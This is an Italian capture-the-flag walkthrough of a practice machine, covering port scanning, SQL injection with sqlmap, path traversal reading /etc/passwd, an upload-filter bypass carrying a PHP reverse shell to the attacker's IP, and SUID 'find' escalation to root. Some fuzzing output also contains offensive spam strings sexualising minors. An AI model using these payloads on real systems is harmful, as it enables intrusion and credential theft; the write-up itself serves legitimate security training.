#tryhackmelabs #laboratorio 

https://tryhackme.com/room/expose

Questa sfida è un test iniziale per valutare le tue capacità di red teaming. Avvia la VM cliccando sul `Start Machine`pulsante in alto a destra dell'attività. Troverai tutti gli strumenti necessari per completare la sfida, come Nmap , sqlmap , wordlist, shell PHP e molti altri nell'AttackBox.  

_Esporre servizi non necessari in una macchina può essere pericoloso. Riesci a catturare le bandiere e a violare la macchina_ ?


```
nmap -Pn -sN -v -O -p- 10.10.87.145
```

```
PORT     STATE         SERVICE
21/tcp   open|filtered ftp
22/tcp   open|filtered ssh
53/tcp   open|filtered domain
1337/tcp open|filtered waste
1883/tcp open|filtered mqtt
```

```
nmap -sVC -v -p21,22,53,1337,1883 10.10.87.145
```
```
PORT     STATE SERVICE                 VERSION
21/tcp   open  ftp                     vsftpd 2.0.8 or later
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.14.99.134
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp   open  ssh                     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 7a:32:9f:8c:75:6f:27:78:7b:40:51:e4:86:93:cf:8c (RSA)
|   256 b3:38:39:f9:38:3d:94:7e:d5:91:4f:27:c9:64:ae:78 (ECDSA)
|_  256 f5:75:a4:c1:67:34:b1:64:0c:28:da:1d:3d:44:a2:54 (ED25519)
53/tcp   open  domain                  ISC BIND 9.16.1 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.16.1-Ubuntu
1337/tcp open  http                    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: EXPOSED
1883/tcp open  mosquitto version 1.6.9
| mqtt-subscribe: 
|   Topics and their most recent payloads: 
|     $SYS/broker/load/sockets/5min: 0.20
|     $SYS/broker/heap/maximum: 49688
|     $SYS/broker/load/sockets/15min: 0.07
|     $SYS/broker/load/bytes/sent/1min: 3.65
|     $SYS/broker/load/bytes/received/5min: 3.53
|     $SYS/broker/load/messages/sent/1min: 0.91
|     $SYS/broker/load/messages/received/1min: 0.91
|     $SYS/broker/store/messages/bytes: 179
|     $SYS/broker/bytes/received: 18
|     $SYS/broker/load/bytes/sent/5min: 0.79
|     $SYS/broker/messages/received: 1
|     $SYS/broker/messages/sent: 1
|     $SYS/broker/load/messages/received/5min: 0.20
|     $SYS/broker/load/messages/sent/15min: 0.07
|     $SYS/broker/load/messages/sent/5min: 0.20
|     $SYS/broker/uptime: 209 seconds
|     $SYS/broker/load/sockets/1min: 0.91
|     $SYS/broker/version: mosquitto version 1.6.9
|     $SYS/broker/bytes/sent: 4
|     $SYS/broker/load/bytes/received/15min: 1.19
|     $SYS/broker/load/bytes/sent/15min: 0.27
|     $SYS/broker/load/connections/1min: 0.91
|     $SYS/broker/load/connections/15min: 0.07
|     $SYS/broker/load/bytes/received/1min: 16.45
|     $SYS/broker/load/messages/received/15min: 0.07
|_    $SYS/broker/load/connections/5min: 0.20
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

otteniamo tante info!

| **Porta** | **Stato** | **Servizio** | **Versione**              | **Note e vulnerabilità potenziali**                                                                                                                                                                             |
| --------- | --------- | ------------ | ------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| 21/tcp    | aperta    | FTP          | vsftpd 2.0.8 o successivo | Accesso FTP anonimo consentito (FTP code 230), che può esporre il server a download non autorizzati. Versione vsftpd 3.0.3 è generalmente considerata sicura, ma è importante mantenere aggiornato il software. |
| 22/tcp    | aperta    | SSH          | OpenSSH 8.2p1             | Versione relativamente recente, ma è fondamentale assicurarsi che le configurazioni di sicurezza siano ottimali (es. disabilitare l'accesso root, utilizzare chiavi SSH).                                       |
| 53/tcp    | aperta    | DNS          | ISC BIND 9.16.1           | Versione nota per vulnerabilità in passato di attacchi DNS                                                                                                                                                      |
| 1337/tcp  | aperta    | HTTP         | Apache 2.4.41             | Versione di Apache che potrebbe avere vulnerabilità                                                                                                                                                             |
| 1883/tcp  | aperta    | MQTT         | Mosquitto 1.6.9           | Versione di Mosquitto che potrebbe avere vulnerabilità                                                                                                                                                          |
|           |           |              |                           |                                                                                                                                                                                                                 |

passiamo subito all'accesso FTP per vedere se troviamo cose interessanti

```
ftp 10.10.87.145
```
mettiamo come utente
```
anonymous
```
ed alla richiesta di password facciamo invio senza immettere nulla
```
┌──(root㉿kali)-[/home/kali/Downloads/Laboratori]
└─# ftp 10.10.87.145
Connected to 10.10.87.145.
220 Welcome to the Expose Web Challenge.
Name (10.10.87.145:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```
eccoci dentro!
```
ls
```
```
ftp> ls
229 Entering Extended Passive Mode (|||53675|)
150 Here comes the directory listing.
226 Directory send OK.
```
ftp è passivo allora eseguiamo
```
passive off
```

```
ftp> pwd
Remote directory: /
ftp> whoami
?Invalid command.
ftp> id
550 Permission denied.
ftp> ls -al
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        121          4096 Jun 11  2023 .
drwxr-xr-x    2 0        121          4096 Jun 11  2023 ..
226 Directory send OK.
ftp> 
```
siamo in un vicolo cieco"
passiamo all'indirizzo http su porta 1337  per vedere cosa troviamo
```
http://10.10.87.145:1337/
```
 visitando la pagina troviamo scritto EXPOSED
```
<!DOCTYPE html>
<html>
<head>
	<title>EXPOSED</title>
</head>
<body>
<h1>EXPOSED</h1>
```

facciamo un po di enumerazione
```
gobuster dir -u http://10.10.87.145:1337/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

```
┌──(root㉿kali)-[/home/kali/Downloads/Laboratori]
└─# gobuster dir -u http://10.10.87.145:1337/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.87.145:1337/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 301) [Size: 319] [--> http://10.10.87.145:1337/admin/]
/javascript           (Status: 301) [Size: 324] [--> http://10.10.87.145:1337/javascript/]
/phpmyadmin           (Status: 301) [Size: 324] [--> http://10.10.87.145:1337/phpmyadmin/]
/server-status        (Status: 403) [Size: 279]
/18 yr School Girls Sex Beauty Preteen Pron Cute Hidden Camera Dbz Sailor Moon Hentai Rape Lolita Asf Mov Fuck Young Uniform (Status: 414) [Size: 356]
/ADULT Young Cute French Slut Bitch Practically Rape Incest Sex xxx Porno PreTeenage Lolita Hardcore Fuck Anal Blow Job F (Status: 414) [Size: 356]
/Z Angelina Jolie Nude Video Gia naked celebrity movie sexy celeb naked no sex boobs breasts look HOT new dvdrip (Status: 414) [Size: 356]
Progress: 220560 / 220561 (100.00%)
===============================================================
Finished

```

proviamo ad andare su
```
http://10.10.87.145:1337/admin/
```
dopo un po di tentativi ci accorgiamo che il login non prende l'invio , probabilmente non è questa la pagina di login

su 
```
http://10.10.87.145:1337/phpmyadmin/
```
abbiamo un login phpmyadmin

ci sfugge qualcosa , enumeriamo di nuovo con un' altro dizionario 
```
raft-small-words.txt
```
scaricato da 
```
https://github.com/danielmiessler/SecLists/tree/master/Discovery/Web-Content
```

```
ffuf -u http://10.10.87.145:1337/FUZZ -w /home/kali/Downloads/raft-small-words.txt
```
```
.html-                  [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 50ms]
.htuser                 [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 50ms]
admin_101               [Status: 301, Size: 323, Words: 20, Lines: 10, Duration: 50ms]
```
troviamo interessante
```
http://10.10.87.145:1337/admin_101
```
apriamo e troviamo un login
proviamo con una password casuale e ci restituisce error probabilmente di sql
possiamo provare a catturare la richiesta con burp suite
```
POST /admin_101/includes/user_login.php HTTP/1.1
Host: 10.10.87.145:1337
User-Agent: J
Accept: */*
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 39
Origin: http://10.10.87.145:1337
Connection: keep-alive
Referer: http://10.10.87.145:1337/admin_101/
Cookie: PHPSESSID=8t9agmf7lehmsdsa3cojm4sk28
Priority: u=0

email=hacker%40root.thm&password=123456
```

```
HTTP/1.1 200 OK
Date: Thu, 31 Jul 2025 13:11:50 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Length: 111
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: application/json

{
    "status": "error",
    "messages": [
        "SELECT * FROM user WHERE email = 'hacker@root.thm'"
    ]
}
```
potrebbe essere vulnerabile!
salviamo la richiesta in un file test.req
e diamola in pasto a sqlmap

```
sqlmap -r test.req --dump
```

```
Database: expose
Table: user
[1 entry]
+----+-----------------+---------------------+--------------------------------------+
| id | email           | created             | password                             |
+----+-----------------+---------------------+--------------------------------------+
| 1  | hacker@root.thm | 2023-02-21 09:05:46 | VeryDifficultPassword!!#@#@!#!@#1231 |
+----+-----------------+---------------------+--------------------------------------+

do you want to use common password suffixes? (slow!) [y/N] y
[09:25:19] [INFO] starting dictionary-based cracking (md5_generic_passwd)
[09:25:19] [INFO] starting 3 processes 
[09:25:22] [INFO] cracked password 'easytohack' for hash '69c66901194a6486176e81f5945b8929'                                                    
Database: expose                                                                                                                               
Table: config
[2 entries]
+----+------------------------------+-----------------------------------------------------+
| id | url                          | password                                            |
+----+------------------------------+-----------------------------------------------------+
| 1  | /file1010111/index.php       | 69c66901194a6486176e81f5945b8929 (easytohack)       |
| 3  | /upload-cv00101011/index.php | // ONLY ACCESSIBLE THROUGH USERNAME STARTING WITH Z |

```
troviamo le credenziali dell'utente
```
hacker@root.thm
```
ed un altri due  collegamenti ma uno è "ACCESSIBILE SOLO TRAMITE NOME UTENTE CHE INIZIA CON Z"

iniziamo con loggarci come
```
hacker@root.thm
```
password
```
VeryDifficultPassword!!#@#@!#!@#1231
```
veniamo reindirizzati su
```
http://10.10.87.145:1337/admin_101/chat.php
```
dove non possiamo fare altro

controlliamo allora

```
http://10.10.87.145:1337/file1010111/index.php
```
ci chiede di immettere una password
abbiamo un hash trovato precedentemente con scritto facile da hackerare
```
69c66901194a6486176e81f5945b8929
```
possiamo provare a vedere se è un hash già conosciuto su 
```
https://crackstation.net/
```
e la password è proprio
```
easytohack
```
la immettiamo ed otteniamo una pagina con scritto
```
Anche il fuzzing dei parametri è importante :) oppure è possibile nascondere gli elementi DOM?
```
visualizziamo la pagina sorgente
```
  <!-- Main Content -->
<main class=" mx-auto py-8  min-h-[80vh] flex items-center justify-center gap-10 flex-col xl:flex-row">
 <p class="mb-4"><strong>Parameter Fuzzing is also important :)  or Can you hide DOM elements? <strong></p><span  style="display: none;">Hint: Try file or view as GET parameters?</span>
```
c'è un suggerimento menziona file e get,  significa che utilizzando una richiesta Get e un parametro file potremmo avere una vulnerabilità di inclusione di file locali.

`?file=index.php`Questa è una stringa di query. Viene utilizzata per passare dati al server come coppie chiave-valore. In questo caso, specifica che il file dei parametri ha il valore index.php.

```
http://10.10.87.145:1337/file1010111/index.php?file=index.php
```

immettiamo questa stringa nel browser e vediamo una pagina strana Admin Access che ci fa capire che è vulnerabile

a questo punto possiamo provare un Path Traversal per vedere se riusciamo a leggere le password

```
http://10.10.87.145:1337/file1010111/index.php?file=..//..//..//..//etc/passwd
```
se richiesto reimmettere la password `easytohack`

```
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:106::/nonexistent:/usr/sbin/nologin syslog:x:104:110::/home/syslog:/usr/sbin/nologin _apt:x:105:65534::/nonexistent:/usr/sbin/nologin tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin sshd:x:109:65534::/run/sshd:/usr/sbin/nologin landscape:x:110:115::/var/lib/landscape:/usr/sbin/nologin pollinate:x:111:1::/var/cache/pollinate:/bin/false ec2-instance-connect:x:112:65534::/nonexistent:/usr/sbin/nologin systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false mysql:x:113:119:MySQL Server,,,:/nonexistent:/bin/false zeamkish:x:1001:1001:Zeam Kish,1,1,:/home/zeamkish:/bin/bash ftp:x:114:121:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin bind:x:115:122::/var/cache/bind:/usr/sbin/nologin Debian-snmp:x:116:123::/var/lib/snmp:/bin/false redis:x:117:124::/var/lib/redis:/usr/sbin/nologin mosquitto:x:118:125::/var/lib/mosquitto:/usr/sbin/nologin fwupd-refresh:x:119:126:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
```

abbiamo cosi trovato l'utente che inizia per la lettera Z
```
zeamkish:x:1001:1001:Zeam Kish,1,1,:/home/zeamkish:/bin/bash
```

riandiamo quindi in

```
http://10.10.87.145:1337/upload-cv00101011/index.php
```
e mettiamo come password
```
zeamkish
```

ora da questa pagina possiamo uploadare un file ma ha il filtro solo .png
creiamo prima il nostro file di reverse shell

```
nano revshell.php
```
```
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.14.99.134/1234 0>&1'");
```

```
cp revshell.php revshell.php.png
```
ed ora vediamo se con burp suite possiamo bypassare il filtro png

catturiamo la richiesta del caricamento del file revshell.php.png , rimoviamo l'estensione  e inviamo
```
POST /upload-cv00101011/index.php HTTP/1.1
Host: 10.10.87.145:1337
User-Agent: J
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------2626063554495700473352778087
Content-Length: 296
Origin: http://10.10.87.145:1337
Connection: keep-alive
Referer: http://10.10.87.145:1337/upload-cv00101011/index.php
Cookie: PHPSESSID=8t9agmf7lehmsdsa3cojm4sk28
Upgrade-Insecure-Requests: 1
Priority: u=0, i

-----------------------------2626063554495700473352778087
Content-Disposition: form-data; name="file"; filename="revshell.php.png"
Content-Type: image/png

<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.14.99.134/1234 0>&1'");

-----------------------------2626063554495700473352778087--
```
modifichiamo questa riga
```
Content-Disposition: form-data; name="file"; filename="revshell.php.png"
```
in
```
Content-Disposition: form-data; name="file"; filename="revshell.php"
```
ed inviamo
Guardando il codice sorgente della pagina possiamo vedere che il file è caricato nella directory **/upload_thm_1001**
troviamo il nostro file all'indirizzo
```
http://10.10.87.145:1337/upload-cv00101011/upload_thm_1001/
```

ci mettiamo in ascolto sulla nostra macchina
```
nc -lvnp 1234
```

e clicchiamo su revshell.php del sito

abbiamo ottenuto la nostra revshell!

```
└─# nc -lvnp 1234                   
listening on [any] 1234 ...
connect to [10.14.99.134] from (UNKNOWN) [10.10.87.145] 45856
bash: cannot set terminal process group (783): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ip-10-10-87-145:/var/www/html/upload-cv00101011/upload_thm_1001$
```
navighiamo tra le dir
```
<ww/html/upload-cv00101011/upload_thm_1001$ cd /home                      
www-data@ip-10-10-87-145:/home$ ls
ls
ubuntu
zeamkish
www-data@ip-10-10-87-145:/home$ cd zeamkish
cd zeamkish
www-data@ip-10-10-87-145:/home/zeamkish$ ls
ls
flag.txt
ssh_creds.txt
www-data@ip-10-10-87-145:/home/zeamkish$ cat flag.txt
cat flag.txt
cat: flag.txt: Permission denied
www-data@ip-10-10-87-145:/home/zeamkish$ cat ssh_creds.txt
cat ssh_creds.txt
SSH CREDS
zeamkish
easytohack@123
www-data@ip-10-10-87-145:/home/zeamkish$ 
```
come vedete ,possiamo leggere solo il file ssh_creds.txt ma è tanta roba! possiamo sia loggarci tramite ssh per avere una shell piu stabile oppure semplicemente
```
su zeamkish
```
password
```
easytohack@123
```

```
www-data@ip-10-10-87-145:/home/zeamkish$ su zeamkish
su zeamkish
Password: easytohack@123
whoami
zeamkish
ls
flag.txt
ssh_creds.txt
cat flag.txt
THM{USER_FLAG_1231_EXPOSE}

```
ecco la flag utente!
```
THM{USER_FLAG_1231_EXPOSE}
```

```
sudo -l
```
 non pussiamo eseguire alcun binario come sudo, quindi cerchiamo tutti i binari con il bit SUID impostato
```
find / -type f -perm -u=s 2>/dev/null
```
```
/usr/bin/chfn
/usr/bin/pkexec
/usr/bin/sudo
/usr/bin/umount
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/nano
/usr/bin/su
/usr/bin/fusermount
/usr/bin/find
/usr/bin/at
/usr/bin/mount

```
troviamo  il binario find con il bit SUID impostato

utilizziamo [**GTFobins**](https://gtfobins.github.io/gtfobins/find/#suid)
dove troviamo come elevare i privilegi

```
## Sudo[](https://gtfobins.github.io/gtfobins/find/#sudo)

If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

    sudo find . -exec /bin/sh \; -quit
```
quindi eseguiamo
```
/usr/bin/find . -exec /bin/sh -p \; -quit
```

```
/usr/bin/find . -exec /bin/sh -p \; -quit
whoami
root
pwd
/home/zeamkish
cd /root
ls -al
total 40
drwx------  5 root root 4096 Jun 11  2023 .
drwxr-xr-x 20 root root 4096 Jul 31 11:18 ..
-rw-------  1 root root  330 Jun 30  2023 .bash_history
-rw-r--r--  1 root root 3106 Dec  5  2019 .bashrc
drwxr-xr-x  3 root root 4096 Jun  2  2023 .local
-rw-------  1 root root   13 May 25  2023 .mysql_history
-rw-r--r--  1 root root  161 Dec  5  2019 .profile
drwx------  2 root root 4096 May 25  2023 .ssh
-rw-r--r--  1 root root   23 Jun 11  2023 flag.txt
drwxr-xr-x  4 root root 4096 May 25  2023 snap
cat flag.txt
THM{xxxxxxxxxxxx}

```
trovata la flag di root!
```
THM{xxxxxxxxx}
```

https://writeups.cybersecaware.ie/posts/exposed/
https://blu3whal3.medium.com/expose-tryhackme-walkthrough-34d4685d6225

